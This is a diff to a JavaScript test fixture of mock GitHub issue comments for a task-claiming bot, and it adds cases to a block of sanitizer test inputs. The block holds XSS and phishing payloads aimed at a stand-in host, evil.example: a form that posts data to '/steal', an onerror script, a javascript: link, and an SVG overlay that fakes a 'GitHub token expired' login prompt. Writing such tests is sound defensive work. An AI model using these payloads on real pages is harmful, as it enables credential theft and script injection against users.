@@ -164,7 +164,15 @@ const comment = (num, login, body, h, extra = {}) => ({
 })
 
 export const comments = [
-  comment(1, 'alice', '/take', 26),
+  comment(1, 'alice', '/take', 26, { reactions: { '+1': 1, confused: 1 } }), // someone's 😕 next to the bot's 👍
+  comment(1, 'sam', '/drop @alice', 25, { reactions: { '+1': 0, confused: 1 } }),
+  comment(
+    1,
+    'sam',
+    '/reject Duplicate of https://github.com/octo/board/issues/1#issuecomment-1234567890123456789012345678901234567890',
+    25,
+    { reactions: { '+1': 0, confused: 1 } },
+  ),
   comment(1, 'alice', 'Found it: the overlap window is applied twice in `chunker.py`. PR coming tonight.', 5),
   comment(3, 'bob', '/take', 40),
   comment(3, 'chen', 'I can write the normalization section.\n/take', 30),
@@ -184,6 +192,9 @@ export const comments = [
       '<form action="https://evil.example/steal"><textarea name="t"></textarea></form>',
       '<img src="https://evil.example/pixel.png" onerror="window.__pwned = true">',
       '[click me](javascript:window.__pwned=true)',
+      '<svg width="1" height="1" overflow="visible"><a href="https://evil.example/login"><rect x="-3000" y="-3000" width="8000" height="8000" fill="white"/><text x="20" y="40">Your GitHub token expired</text></a></svg>',
+      '<math><mtext><a href="https://evil.example/m">math link</a></mtext></math>',
+      'See [the guide](https://docs.github.com/issues) for details.',
       '- [x] a real task list still renders\n  - [ ] its sub-task<style>.x{color:red}</style>',
     ].join('\n\n'),
     3,
